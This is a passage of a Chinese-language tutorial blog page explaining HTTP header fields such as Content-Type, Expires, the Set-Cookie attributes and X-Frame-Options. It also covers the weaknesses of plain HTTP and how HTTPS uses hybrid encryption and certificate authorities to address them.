</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p>
<h4 id="content-type" tabindex="-1"><a class="header-anchor" href="#content-type" aria-hidden="true">#</a> Content-Type</h4>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Content-Type: text/html; charset=UTF-8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。参数 charset 使用 iso-8859-1 或 euc-jp 等字符集进行赋值。</p>
<h4 id="expires" tabindex="-1"><a class="header-anchor" href="#expires" aria-hidden="true">#</a> Expires</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152146937.png" alt="image-20220804152146937"></p>
<p><code v-pre>Expires: Wed, 04 Jul 2012 08:26:05 GMT</code></p>
<p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在 Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p>
<p>源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。</p>
<p>但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。</p>
<h4 id="last-modified" tabindex="-1"><a class="header-anchor" href="#last-modified" aria-hidden="true">#</a> Last-Modified</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152154870.png" alt="image-20220804152154870"></p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Last-Modified: Wed, 23 May 2012 09:59:55 GMT
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。</p>
<h3 id="为-cookie-服务的首部字段" tabindex="-1"><a class="header-anchor" href="#为-cookie-服务的首部字段" aria-hidden="true">#</a> 为 Cookie 服务的首部字段</h3>
<p>管理服务器与客户端之间状态的 Cookie，虽然没有被编入标准化HTTP/1.1 的 RFC2616 中，但在 Web 网站方面得到了广泛的应用。</p>
<p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接
着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。</p>
<p>调用 Cookie 时，由于可校验 Cookie 的 <strong>有效期</strong> ，以及发送方的 <strong>域、路径、协议</strong> 等信息，所以正规发布的 Cookie 内的数据不会因来自其他 Web 站点和攻击者的攻击而泄露。</p>
<p>为 Cookie 服务的首部字段</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152206830.png" alt="image-20220804152206830"></p>
<h4 id="set-cookie" tabindex="-1"><a class="header-anchor" href="#set-cookie" aria-hidden="true">#</a> Set-Cookie</h4>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Set-Cookie: status=enable; expires=Tue, 05 Jul 2011 07:26:31 GMT; path=/; domain=.hackr.jp;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。下面的表格列举了 Set-Cookie 的字段值。</p>
<p>Set-Cookie 字段的属性</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152216749.png" alt="image-20220804152216749"></p>
<p><strong>expires 属性</strong></p>
<p>Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session）
时间段内。这通常限于浏览器应用程序被关闭之前。</p>
<p>另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。</p>
<p><strong>path 属性</strong></p>
<p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>
<p><strong>domain 属性</strong></p>
<p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，www.example.com
或 www2.example.com 等都可以发送 Cookie。因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全。</p>
<p><strong>secure 属性</strong></p>
<p>Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。</p>
<p>发送 Cookie 时，指定 secure 属性的方法如下所示。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Set-Cookie: name=value; secure
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>以上例子仅当在 https://www.example.com/（HTTPS）安全连接的情况下才会进行 Cookie 的回收。也就是说，即使域名相同，
http://www.example.com/（HTTP）也不会发生 Cookie 回收行为。当省略 secure 属性时，不论 HTTP 还是 HTTPS，都会对 Cookie 进行回收。</p>
<p><strong>HttpOnly 属性</strong></p>
<p>Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。</p>
<p>发送指定 HttpOnly 属性的 Cookie 的方法如下所示。</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Set-Cookie: name=value; HttpOnly
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持Cookie 了。</p>
<p>虽然是独立的扩展功能，但 Internet Explorer 6 SP1 以上版本等当下的主流浏览器都已经支持该扩展了。另外顺带一提，该扩展并非是为了
防止 XSS 而开发的。</p>
<h4 id="cookie" tabindex="-1"><a class="header-anchor" href="#cookie" aria-hidden="true">#</a> Cookie</h4>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>Cookie: status=enable
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个 Cookie 时，同样可以以多个 Cookie 形式发送。</p>
<h3 id="其他首部字段" tabindex="-1"><a class="header-anchor" href="#其他首部字段" aria-hidden="true">#</a> 其他首部字段</h3>
<p>HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。</p>
<p>接下来，我们就一些最为常用的首部字段进行说明。</p>
<ul>
<li>X-Frame-Options</li>
<li>X-XSS-Protection</li>
<li>DNT</li>
<li>P3P</li>
</ul>
<h4 id="x-frame-options" tabindex="-1"><a class="header-anchor" href="#x-frame-options" aria-hidden="true">#</a> X-Frame-Options</h4>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>X-Frame-Options: DENY
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容。在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p>
<p>首部字段 X-Frame-Options 有以下两个可指定的字段值。</p>
<ul>
<li>DENY ：拒绝</li>
<li>SAMEORIGIN ：仅同源域名下的页面（Top-level-browsingcontext）匹配时许可。（比如，当指定 http://hackr.jp/sample.html
页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）</li>
</ul>
<p>支持该首部字段的浏览器有：<code v-pre>Internet Explorer 8</code>、<code v-pre>Firefox 3.6.9+</code>、<code v-pre>Chrome 4.1.249.1042+</code>、<code v-pre>Safari 4+</code> 和 <code v-pre>Opera 10.50+</code> 等。现在主流的浏览器都已经支持。</p>
<p>能在所有的 Web 服务器端预先设定好 X-Frame-Options 字段值是最理想的状态。</p>
<p>对 apache2.conf 的配置实例</p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>&lt;IfModule mod_headers.c>
Header append X-FRAME-OPTIONS "SAMEORIGIN"
&lt;/IfModule>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="x-xss-protection" tabindex="-1"><a class="header-anchor" href="#x-xss-protection" aria-hidden="true">#</a> X-XSS-Protection</h4>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>X-XSS-Protection: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p>
<p>首部字段 X-XSS-Protection 可指定的字段值如下。</p>
<ul>
<li>0 ：将 XSS 过滤设置成无效状态</li>
<li>1 ：将 XSS 过滤设置成有效状态</li>
</ul>
<h4 id="dnt" tabindex="-1"><a class="header-anchor" href="#dnt" aria-hidden="true">#</a> DNT</h4>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804152240475.png" alt="image-20220804152240475"></p>
<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>DNT: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方
法。</p>
<p>首部字段 DNT 可指定的字段值如下。</p>
<p>0 ：同意被追踪</p>
<p>1 ：拒绝被追踪</p>
<p>由于首部字段 DNT 的功能具备有效性，所以 Web 服务器需要对 DNT
做对应的支持。</p>
<blockquote>
<p>协议中对 X- 前缀的废除在 HTTP 等多种协议中，通过给非标准参数加上前缀 X-，来区别于标准参数，并使那些非标准的参数作为扩展变成可能。但是这种简单粗暴的做法有百害而无一益，因此在“RFC 6648 - Deprecatingthe &quot;X-&quot; Prefix and Similar Constructs in Application Protocols”中提议停止该做法。</p>
<p>然而，对已经在使用中的 X- 前缀来说，不应该要求其变更。</p>
</blockquote>
<h2 id="确保-web-安全的-https" tabindex="-1"><a class="header-anchor" href="#确保-web-安全的-https" aria-hidden="true">#</a> 确保 Web 安全的 HTTPS</h2>
<h3 id="http-的缺点" tabindex="-1"><a class="header-anchor" href="#http-的缺点" aria-hidden="true">#</a> HTTP 的缺点</h3>
<p>到现在为止，我们已了解到 HTTP 具有相当优秀和方便的一面，然而HTTP 并非只有好的一面，事物皆具两面性，它也是有不足之处的。HTTP 主要有这些不足，例举如下。</p>
<ul>
<li>通信使用明文（不加密），内容可能会被窃听</li>
<li>不验证通信方的身份，因此有可能遭遇伪装</li>
<li>无法证明报文的完整性，所以有可能已遭篡改</li>
</ul>
<p>这些问题不仅在 HTTP 上出现，其他未加密的协议中也会存在这类问题。</p>
<p>除此之外，HTTP 本身还有很多缺点。而且，还有像某些特定的 Web 服务器和特定的 Web 浏览器在实际应用中存在的不足（也可以说成
是脆弱性或安全漏洞），另外，用 Java 和 PHP 等编程语言开发的 Web 应用也可能存在安全漏洞。</p>
<h4 id="通信使用明文可能会被窃听" tabindex="-1"><a class="header-anchor" href="#通信使用明文可能会被窃听" aria-hidden="true">#</a> 通信使用明文可能会被窃听</h4>
<p>由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p>
<ul>
<li>TCP/IP 是可能被窃听的网络</li>
</ul>
<p>如果要问为什么通信时不加密是一个缺点，这是因为，按TCP/IP 协议族的工作机制，通信内容在所有的通信线路上都有可能遭到窥视。</p>
<p>所谓互联网，是由能连通到全世界的网络组成的。无论世界哪个角落的服务器在和客户端通信时，在此通信线路上的某些网络设
备、光缆、计算机等都不可能是个人的私有物，所以不排除某个环节中会遭到恶意窥视行为。</p>
<p>即使已经过加密处理的通信，也会被窥视到通信内容，这点和未加密的通信是相同的。只是说如果通信经过加密，就有可能让人无法破解报文信息的含义，但加密处理后的报文信息本身还是会被看到的。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804154634713.png" alt="image-20220804154634713"></p>
<p>图：互联网上的任何角落都存在通信内容被窃听的风险</p>
<p>窃听相同段上的通信并非难事。只需要收集在互联网上流动的数据包（帧）就行了。对于收集来的数据包的解析工作，可交给那些抓包（Packet Capture）或嗅探器（Sniffer）工具。</p>
<p>下面的图片示例就是被广泛使用的抓包工具 Wireshark。它可以 获取 HTTP 协议的请求和响应的内容，并对其进行解析。</p>
<p>像使用 GET 方法发送请求、响应返回了 200 OK，查看 HTTP 响 应报文的全部内容等一系列的事情都可以做到。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804154756196.png" alt="image-20220804154756196"></p>
<ul>
<li>加密处理防止被窃听</li>
</ul>
<p>在目前大家正在研究的如何防止窃听保护信息的几种对策中，最 为普及的就是加密技术。加密的对象可以有这么几个。</p>
<p>通信的加密</p>
<p>一种方式就是将通信加密。HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或 TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。 用 SSL建立安全通信线路之后，就可以在这条线路上进行 HTTP 通信了。与 SSL组合使用的 HTTP 被称为 HTTPS（HTTP Secure，超文本传输安全协议）或 HTTP over SSL。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804160446918.png" alt="image-20220804160446918"></p>
<p>内容的加密</p>
<p>还有一种将参与通信的内容本身加密的方式。由于 HTTP 协议中 没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把 HTTP 报文里所含的内容进行加密处理。</p>
<p>在这种情况下，客户端需要对 HTTP 报文进行加密处理后再发送 请求。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804160638953.png" alt="image-20220804160638953"></p>
<p>诚然，为了做到有效的内容加密，前提是要求客户端和服务器同 时具备加密和解密机制。主要应用在 Web 服务中。有一点必须引起注意，由于该方式不同于 SSL或 TLS 将整个通信线路加密 处理，所以内容仍有被篡改的风险。稍后我们会加以说明。</p>
<h4 id="不验证通信方的身份就可能遭遇伪装" tabindex="-1"><a class="header-anchor" href="#不验证通信方的身份就可能遭遇伪装" aria-hidden="true">#</a> 不验证通信方的身份就可能遭遇伪装</h4>
<p>HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服 务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的 返回到实际提出请求的客户端”等类似问题。</p>
<ol>
<li>任何人都可发起请求</li>
</ol>
<p>在 HTTP 协议通信时，由于不存在确认通信方的处理步骤，任何 人都可以发起请求。另外，服务器只要接收到请求，不管对方是 谁都会返回一个响应（但也仅限于发送端的 IP 地址和端口号没 有被 Web 服务器设定限制访问的前提下）。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804161537585.png" alt="image-20220804161537585"></p>
<ul>
<li>无法确定请求发送至目标的 Web 服务器是否是按真实意 图返回响应的那台服务器。有可能是已伪装的 Web 服务 器。</li>
<li>无法确定响应返回到的客户端是否是按真实意图接收响 应的那个客户端。有可能是已伪装的客户端。</li>
<li>无法确定正在通信的对方是否具备访问权限。因为某些 Web 服务器上保存着重要的信息，只想发给特定用户通 信的权限。</li>
<li>无法判定请求是来自何方、出自谁手。</li>
<li>即使是无意义的请求也会照单全收。无法阻止海量请求 下的 DoS 攻击（Denial of Service，拒绝服务攻击）。</li>
</ul>
<ol start="2">
<li>查明对手的证书</li>
</ol>
<p>虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL则可以。 SSL不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。</p>
<p>证书由值得信任的第三方机构颁发，用以证明服务器和客户端是 实际存在的。另外，伪造证书从技术角度来说是异常困难的一件 事。所以只要能够确认通信方（服务器或客户端）持有的证书， 即可判断通信方的真实意图。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804162427765.png" alt="image-20220804162427765"></p>
<p>通过使用证书，以证明通信方就是意料中的服务器。这对使用者 个人来讲，也减少了个人信息泄露的危险性。</p>
<p>另外，客户端持有证书即可完成个人身份的确认，也可用于对 Web 网站的认证环节。</p>
<h4 id="无法证明报文完整性-可能已遭篡改" tabindex="-1"><a class="header-anchor" href="#无法证明报文完整性-可能已遭篡改" aria-hidden="true">#</a> 无法证明报文完整性，可能已遭篡改</h4>
<ul>
<li>接收到的内容可能有误</li>
</ul>
<p>​		由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响 应送出之后直到对方接收之前的这段时间内，即使请求或响应的 内容遭到篡改，也没有办法获悉。</p>
<p>换句话说，没有任何办法确认，发出的请求 / 响应和接收到的请 求 / 响应是前后相同的。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804162638013.png" alt="image-20220804162638013"></p>
<p>比如，从某个 Web 网站上下载内容，是无法确定客户端下载的 文件和服务器上存放的文件是否前后一致的。文件内容在传输途 中可能已经被篡改为其他的内容。即使内容真的已改变，作为接 收方的客户端也是觉察不到的。</p>
<p>像这样，请求或响应在传输途中，遭攻击者拦截并篡改内容的攻 击称为中间人攻击（Man-in-the-Middle attack，MITM）。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804162847549.png" alt="image-20220804162847549"></p>
<ul>
<li>如何防止篡改</li>
</ul>
<p>​	虽然有使用 HTTP 协议确定报文完整性的方法，但事实上并不便 捷、可靠。其中常用的是 MD5 和 SHA-1 等散列值校验的方法， 以及用来确认文件的数字签名方法。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804163134154.png" alt="image-20220804163134154"></p>
<p>提供文件下载服务的 Web 网站也会提供相应的以 PGP（Pretty Good Privacy，完美隐私）创建的数字签名及 MD5 算法生成的散 列值。PGP 是用来证明创建文件的数字签名，MD5 是由单向函 数生成的散列值。不论使用哪一种方法，都需要操纵客户端的用 户本人亲自检查验证下载的文件是否就是原来服务器上的文件。 浏览器无法自动帮用户检查。</p>
<p>可惜的是，用这些方法也依然无法百分百保证确认结果正确。因 为 PGP 和 MD5 本身被改写的话，用户是没有办法意识到的。</p>
<p>为了有效防止这些弊端，有必要使用 HTTPS。SSL提供认证和加 密处理及摘要功能。仅靠 HTTP 确保完整性是非常困难的，因此 通过和其他协议组合使用来实现这个目标。下节我们介绍 HTTPS 的相关内容。</p>
<h3 id="http-加密-认证-完整性保护-https" tabindex="-1"><a class="header-anchor" href="#http-加密-认证-完整性保护-https" aria-hidden="true">#</a> HTTP<code v-pre>+</code> 加密 <code v-pre>+</code> 认证 <code v-pre>+</code> 完整性保护 =HTTPS</h3>
<h4 id="http-加上加密处理和认证以及完整性保护后即是-https" tabindex="-1"><a class="header-anchor" href="#http-加上加密处理和认证以及完整性保护后即是-https" aria-hidden="true">#</a> HTTP 加上加密处理和认证以及完整性保护后即是 HTTPS</h4>
<p>如果在 HTTP 协议通信过程中使用未经加密的明文，比如在 Web 页 面中输入信用卡号，如果这条通信线路遭到窃听，那么信用卡号就暴 露了。</p>
<p>另外，对于 HTTP 来说，服务器也好，客户端也好，都是没有办法确认通信方的。因为很有可能并不是和原本预想的通信方在实际通信。 并且还需要考虑到接收到的报文在通信途中已经遭到篡改这一可能 性。</p>
<p>为了统一解决上述这些问题，需要在 HTTP 上再加入加密处理和认证 等机制。我们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804163422636.png" alt="image-20220804163422636"></p>
<p>经常会在 Web 的登录页面和购物结算界面等使用 HTTPS 通信。使用 HTTPS 通信时，不再用 http://，而是改用 https://。另外，当浏览器访 问 HTTPS 通信有效的 Web 网站时，浏览器的地址栏内会出现一个带 锁的标记。对 HTTPS 的显示方式会因浏览器的不同而有所改变。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804164013934.png" alt="image-20220804164013934"></p>
<h4 id="https-是身披-ssl-外壳的-http" tabindex="-1"><a class="header-anchor" href="#https-是身披-ssl-外壳的-http" aria-hidden="true">#</a> HTTPS 是身披 SSL 外壳的 HTTP</h4>
<p>HTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用 SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代 替而已。</p>
<p>通常，HTTP 直接和 TCP 通信。当使用 SSL时，则演变成先和 SSL通 信，再由 SSL和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披 SSL协议这层外壳的 HTTP。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804165301230.png" alt="image-20220804165301230"></p>
<p>在采用 SSL后，HTTP 就拥有了 HTTPS 的加密、证书和完整性保护 这些功能。</p>
<p>SSL是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应 用层的 SMTP 和 Telnet 等协议均可配合 SSL协议使用。可以说 SSL是 当今世界上应用最为广泛的网络安全技术。</p>
<h4 id="相互交换密钥的公开密钥加密技术" tabindex="-1"><a class="header-anchor" href="#相互交换密钥的公开密钥加密技术" aria-hidden="true">#</a> 相互交换密钥的公开密钥加密技术</h4>
<p>在对 SSL进行讲解之前，我们先来了解一下加密方法。SSL采用一种 叫做公开密钥加密（Public-key cryptography）的加密处理方式。</p>
<p>近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种 方式得以保持加密方法的安全性。</p>
<p>加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说， 任何人只要持有密钥</p>
<ul>
<li>共享密钥加密的困境</li>
</ul>
<p>加密和解密同用一个密钥的方式称为共享密钥加密（Common key crypto system），也被叫做<strong>对称密钥加密</strong>。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804165922683.png" alt="image-20220804165922683"></p>
<p>以共享密钥方式加密时必须将密钥也发给对方。可究竟怎样才能 安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥 就可会落入攻击者之手，同时也就失去了加密的意义。另外还得 设法安全地保管接收到的密钥。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804170104654.png" alt="image-20220804170104654"></p>
<ul>
<li>使用两把密钥的公开密钥加密</li>
</ul>
<p>公开密钥加密方式很好地解决了共享密钥加密的困难。</p>
<p>公开密钥加密使用一对<strong>非对称的密钥</strong>。一把叫做私有密钥 （private key），另一把叫做公开密钥（public key）。顾名思 义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发 布，任何人都可以获得。</p>
<p><strong>使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进 行加密处理，对方收到被加密的信息后，再使用自己的私有密钥 进行解密。利用这种方式，不需要发送用来解密的私有密钥，也 不必担心密钥被攻击者窃听而盗走。</strong></p>
<p>另外，要想根据密文和公开密钥，恢复到信息原文是异常困难 的，因为解密过程就是在对离散对数进行求值，这并非轻而易举 就能办到。退一步讲，如果能对一个非常大的整数做到快速地因 式分解，那么密码破解还是存在希望的。但就目前的技术来看是 不太现实的。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804171545648.png" alt="image-20220804171545648"></p>
<ul>
<li>HTTPS 采用混合加密机制</li>
</ul>
<p>HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密 机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开 密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处理速度要慢。</p>
<p>所以应充分利用两者各自的优势，将多种方法组合起来用于通 信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交 换报文阶段则使用共享密钥加密方式。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804172356148.png" alt="image-20220804172356148"></p>
<h4 id="证明公开密钥正确性的证书" tabindex="-1"><a class="header-anchor" href="#证明公开密钥正确性的证书" aria-hidden="true">#</a> 证明公开密钥正确性的证书</h4>
<p>遗憾的是，公开密钥加密方式还是存在一些问题的。那就是无法证明 公开密钥本身就是货真价实的公开密钥。比如，正准备和某台服务器 建立公开密钥加密方式下的通信时，如何证明收到的公开密钥就是原 本预想的那台服务器发行的公开密钥。或许在公开密钥传输途中，真正的公开密钥已经被攻击者替换掉了。</p>
<p>为了解决上述问题，可以使用由数字证书认证机构（CA，Certificate Authority）和其相关机关颁发的公开密钥证书。</p>
<p>数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的 立场上。威瑞信（VeriSign）就是其中一家非常有名的数字证书认证 机构。我们来介绍一下数字证书认证机构的业务流程。首先，服务器 的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证 机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签 名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书 后绑定在一起。</p>
<p>服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端， 以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称 为证书。</p>
<p>接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书 上的数字签名进行验证，一旦验证通过，客户端便可明确两件事： 一，认证服务器的公开密钥的是真实有效的数字证书认证机构。二， 服务器的公开密钥是值得信赖的。</p>
<p>此处认证机关的公开密钥必须安全地转交给客户端。使用通信方式 时，如何安全转交是一件很困难的事，因此，多数浏览器开发商发布 版本时，会事先在内部植入常用认证机关的公开密钥。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804174808165.png" alt="image-20220804174808165"></p>
<ul>
<li>可证明组织真实性的 EV SSL 证书</li>
</ul>
<p>证书的一个作用是用来证明作为通信一方的服务器是否规范，另 外一个作用是可确认对方服务器背后运营的企业是否真实存在。 拥有该特性的证书就是 EV SSL证书（Extended Validation SSL Certificate）。</p>
<p>EV SSL证书是基于国际标准的认证指导方针颁发的证书。其严 格规定了对运营组织是否真实的确认方针，因此，通过认证的 Web 网站能够获得更高的认可度。</p>
<p>持有 EV SSL证书的 Web 网站的浏览器地址栏处的背景色是绿色 的，从视觉上就能一眼辨别出。而且在地址栏的左侧显示了 SSL 证书中记录的组织名称以及颁发证书的认证机构的名称。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804175256487.png" alt="image-20220804175256487"></p>
<p>上述机制的原意图是为了防止用户被钓鱼攻击（Phishing），但 就效果上来讲，还得打一个问号。很多用户可能不了解 EV SSL 证书相关的知识，因此也不太会留意它。</p>
<ul>
<li>用以确认客户端的客户端证书</li>
</ul>
<p>HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认 证，证明服务器正在通信的对方始终是预料之内的客户端，其作 用跟服务器证书如出一辙。</p>
<p>但客户端证书仍存在几处问题点。其中的一个问题点是证书的获取及发布。</p>
<p>想获取证书时，用户得自行安装客户端证书。但由于客户端证书 是要付费购买的，且每张证书对应到每位用户也就意味着需支付 和用户数对等的费用。另外，要让知识层次不同的用户们自行安 装证书，这件事本身也充满了各种挑战。</p>
<p>现状是，安全性极高的认证机构可颁发客户端证书但仅用于特殊 用途的业务。比如那些可支撑客户端证书支出费用的业务。</p>
<p>例如，银行的网上银行就采用了客户端证书。在登录网银时不仅 要求用户确认输入 ID 和密码，还会要求用户的客户端证书，以 确认用户是否从特定的终端访问网银。</p>
<p>客户端证书存在的另一个问题点是，客户端证书毕竟只能用来证 明客户端实际存在，而不能用来证明用户本人的真实有效性。也 就是说，只要获得了安装有客户端证书的计算机的使用权限，也 就意味着同时拥有了客户端证书的使用权限。</p>
<ul>
<li>认证机构信誉第一</li>
</ul>
<p>SSL机制中介入认证机构之所以可行，是因为建立在其信用绝对 可靠这一大前提下的。然而，2011 年 7 月，荷兰的一家名叫 DigiNotar 的认证机构曾遭黑客不法入侵，颁布了 google.com 和 twitter.com 等网站的伪造证书事件。这一事件从根本上撼动了 SSL的可信度。</p>
<p>因为伪造证书上有正规认证机构的数字签名，所以浏览器会判定 该证书是正当的。当伪造的证书被用做服务器伪装之时，用户根本无法察觉到。</p>
<p>虽然存在可将证书无效化的证书吊销列表（Certificate Revocation List，CRL）机制，以及从客户端删除根证书颁发机构（Root Certificate Authority，RCA）的对策，但是距离生效还需要一段 时间，而在这段时间内，到底会有多少用户的利益蒙受损失就不 得而知了。</p>
<ul>
<li>由自认证机构颁发的证书称为自签名证书</li>
</ul>
<p>如果使用 OpenSSL这套开源程序，每个人都可以构建一套属于 自己的认证机构，从而自己给自己颁发服务器证书。但该服务器 证书在互联网上不可作为证书使用，似乎没什么帮助。</p>
<p>独立构建的认证机构叫做自认证机构，由自认证机构颁发的“无 用”证书也被戏称为自签名证书。</p>
<p>浏览器访问该服务器时，会显示“无法确认连接安全性”或“该网 站的安全证书存在问题”等警告消息。</p>
<p><img src="https://blog-picgo-typora.oss-cn-hangzhou.aliyuncs.com/image-20220804180204749.png" alt="image-20220804180204749"></p>
